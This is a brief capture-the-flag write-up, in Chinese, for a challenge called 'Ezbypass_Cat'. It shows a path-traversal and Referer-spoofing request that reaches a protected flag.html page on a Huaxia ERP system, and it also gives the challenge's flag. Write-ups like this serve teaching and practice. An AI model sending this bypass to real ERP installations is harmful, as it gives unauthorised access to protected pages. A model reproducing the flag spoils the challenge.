# Ezbypass_Cat

> 目录和访问来源绕过

## 分析

> 原题目其实是提示了flag在flag.html中的,直接访问会报404错误.翻看源码得知是华夏ERP系统,经搜索得知存在目录跨越漏洞,然后更改Referer字段即可.

## payload

```
GET /login.html/../flag.html HTTP/1.1
Host: 61.147.171.105:62338
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=C2E750C3876131277A359A7D5FA13E49; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1676894957,1676899554; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1676899560
Referer: http://61.147.171.105:62338/flag.html
Connection: close
```

## flag

> CatCTF{Drun1baby_is_s0_5illy}